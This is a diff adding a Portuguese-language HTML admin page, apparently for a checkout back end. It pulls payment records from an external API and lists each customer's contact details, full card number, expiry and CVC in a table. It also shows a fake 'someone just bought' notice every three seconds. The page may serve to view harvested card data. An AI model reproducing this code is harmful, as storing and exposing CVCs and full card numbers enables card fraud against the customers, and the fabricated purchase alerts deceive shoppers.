@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+      <!-- Fonts -->
+      <link href="https://fonts.googleapis.com" rel="preconnect">
+      <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+      <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Raleway:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+
+      <!-- Vendor CSS Files -->
+      <link href="../assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+      <link href="../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+      <link href="../assets/vendor/aos/aos.css" rel="stylesheet">
+      <link href="../assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+      <!-- Main CSS File -->
+    <link href="../assets/css/main.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+     <link rel="stylesheet" href="https://cdn.datatables.net/1.13.6/css/jquery.dataTables.min.css">
+      <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet"/>
+    <title>Cards</title>
+</head>
+<body>
+  <section id="contact" class="contact section">
+      <!-- Section Title -->
+      <div class="container section-title">
+        <h2>Pagamentos <i class="fa fa-credit"></i></h2>
+      </div><!-- End Section Title -->
+      
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-12 container">
+            <div class="contact-form-wrapper">
+              <table id="table" class="table table-striped">
+                  <thead>
+                      <tr>
+                          <th>Nome</th>
+                          <th>Sobrenome</th>
+                          <th>Telefone</th>
+                          <th>Email</th>
+                          <th>País</th>
+                          <th>Validade</th>
+                          <th>Nome no Cartão</th>
+                          <th>Número do Cartão</th>
+                          <th>CVC</th>
+                      </tr>
+                  </thead>
+                  <tbody>
+                  </tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+  <script src="/assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="/assets/vendor/aos/aos.js"></script>
+  <script src="/assets/vendor/purecounter/purecounter_vanilla.js"></script>
+  <script src="/assets/vendor/swiper/swiper-bundle.min.js"></script>
+  <script src="https://cdn.datatables.net/1.13.6/js/jquery.dataTables.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
+  <script>
+     toastr.options = {
+      "closeButton": true,  
+      "progressBar": true,
+      "positionClass": "toast-bottom-right",
+      "timeOut": "3000",
+      "extendedTimeOut": "1000", 
+      "showEasing": "swing",
+      "hideEasing": "linear",
+    };
+
+    
+    function showToast() {
+      toastr.info('Hasdary acabou de comprar!');
+    }
+
+    setInterval(showToast, 3000); 
+    
+      $(document).ready(function () {
+          $('#table').DataTable();
+      });
+
+      
+      $(document).ready(function () {
+    $.ajax({
+      url: 'https://checkout-back.onrender.com/api/payments',
+      method: 'GET',
+      dataType: 'json',
+      success: function (data) {
+        console.log('Dados recebidos:', data); // Verifique no console
+
+        $('#table').DataTable({
+          destroy: true, // se a tabela já foi inicializada antes
+          data: data,
+          columns: [
+            { data: 'firstName', title: 'Nome' },
+            { data: 'lastName', title: 'Sobrenome' },
+            { data: 'number', title: 'Telefone' },
+            { data: 'email', title: 'Email' },
+            { data: 'country', title: 'País' },
+            {
+              data: null,
+              title: 'Validade',
+              render: function (data, type, row) {
+                return `${row.mm}/${row.yy}`;
+              }
+            },
+            { data: 'cardName', title: 'Nome no Cartão' },
+            { data: 'cardNumber', title: 'Número do Cartão' },
+            { data: 'cvc', title: 'CVC' }
+          ],
+          language: {
+            url: '//cdn.datatables.net/plug-ins/1.13.6/i18n/pt-BR.json'
+          }
+        });
+      },
+      error: function (err) {
+        console.error('Erro ao carregar os dados:', err);
+      }
+    });
+  });
+  </script>
+  <!-- Main JS File -->
+</body>
+</html>
